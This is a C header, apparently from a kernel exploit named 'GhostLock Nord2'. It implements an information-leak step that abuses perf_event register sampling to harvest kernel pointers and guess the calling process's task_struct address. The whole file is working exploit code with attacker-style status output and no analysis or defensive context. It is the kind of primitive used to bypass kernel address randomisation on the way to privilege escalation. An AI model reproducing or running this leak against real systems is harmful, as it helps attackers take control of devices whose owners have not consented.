/*
 * GhostLock Nord2 - perf_event task_struct leak
 */
#pragma once
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>

#ifndef SYS_perf_event_open
#define SYS_perf_event_open 241
#endif

/*
 * Leak task_struct pointer of calling process via perf_event mmap sampling.
 * Returns 0 on failure.
 */
static uint64_t perf_find_task(void) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type            = PERF_TYPE_SOFTWARE;
    pe.size            = sizeof(pe);
    pe.config          = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period   = 5000;
    pe.sample_type     = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    pe.sample_regs_intr= (1ULL<<32)-1;
    pe.disabled        = 1;
    pe.exclude_user    = 1;
    pe.exclude_hv      = 1;
    pe.exclude_idle    = 1;

    int fd = (int)syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { fprintf(stderr,"[!] perf_event_open: %d\n", fd); return 0; }

    size_t msz = 4096 * (1 + 32);
    void *buf = mmap(NULL, msz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    /* Generate kernel samples - more iterations for better coverage */
    for (volatile int i = 0; i < 2000000; i++) syscall(SYS_gettid);
    for (volatile int i = 0; i < 500000; i++) syscall(SYS_getpid);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *hdr = buf;
    uint64_t head = hdr->data_head;
    __sync_synchronize();
    char *base = (char*)buf + 4096;
    size_t dsz = 4096 * 32;

    uint64_t cands[256]; int nc = 0;
    uint64_t pos = hdr->data_tail;
    while (pos < head && nc < 256) {
        struct perf_event_header *ev = (void*)(base + (pos % dsz));
        if (!ev->size) break;
        if (ev->type == PERF_RECORD_SAMPLE) {
            char *p = (char*)ev + sizeof(*ev);
            p += 8; /* skip IP */
            uint64_t abi = *(uint64_t*)p; p += 8;
            if (abi == 1 || abi == 2) {
                uint64_t *regs = (uint64_t*)p;
                for (int i = 0; i < 32 && nc < 256; i++) {
                    uint64_t v = regs[i];
                    if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
                        cands[nc++] = v;
                }
            }
        }
        pos += ev->size;
    }
    hdr->data_tail = head;
    munmap(buf, msz);
    close(fd);

    if (!nc) { fprintf(stderr,"[!] no kernel ptrs in perf samples\n"); return 0; }

    /* Most frequent candidate = task_struct */
    uint64_t best = 0; int best_cnt = 0;
    for (int i = 0; i < nc; i++) {
        int cnt = 0;
        for (int j = 0; j < nc; j++) if (cands[j]==cands[i]) cnt++;
        if (cnt > best_cnt) { best_cnt=cnt; best=cands[i]; }
    }
    fprintf(stderr,"[*] perf task: %llx (%d/%d votes)\n",
            (unsigned long long)best, best_cnt, nc);
    return best;
}
